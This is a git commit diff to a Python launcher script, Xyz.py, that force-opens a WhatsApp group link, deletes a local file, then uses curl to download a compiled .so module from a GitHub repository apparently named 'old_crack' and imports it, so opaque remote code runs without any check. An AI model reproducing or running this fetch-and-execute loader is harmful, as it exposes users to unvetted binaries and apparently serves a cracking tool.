8446ef561dcb80f741cef5b49d16887541eb9e3c
GANGSTER <167035490+younis-dgk@users.noreply.github.com>
2024-12-19 03:21:16 +0500

    Update Xyz.py

--- Xyz.py
+++ Xyz.py
@@ -9,7 +9,7 @@ import os, sys, platform
 os.system('clear') 
 print('\033[0m [💸] \033[92m join Our WhatsApp group For More Updates 🥰✨') 
 os.system('xdg-open https://chat.whatsapp.com/CSfWIqJDSbJKdwLaQLXDFh')
-print('\n\033[0m [\033[92m✓\033[97m] \033[92m Checking For Updates .... ') 
+print('\n\033[0m [\033[92m✓\033[97m] \033[92m Checking For Updates ....\n') 
 os.system('rm -rf old.so')
  
 try:
@@ -22,7 +22,7 @@ except:
 bit = platform.architecture()[0]
 if bit == '64bit':
     if not os.path.isfile('old.so'):
-        os.system('curl -L https://github.com/younis-dgk/executables/blob/main/old.cpython-312.so?raw=true -o old.so') 
+        os.system('curl -L https://github.com/younis-dgk/old_crack/blob/main/old.cpython-312.so?raw=true -o old.so') 
         import old
     else:
         import old
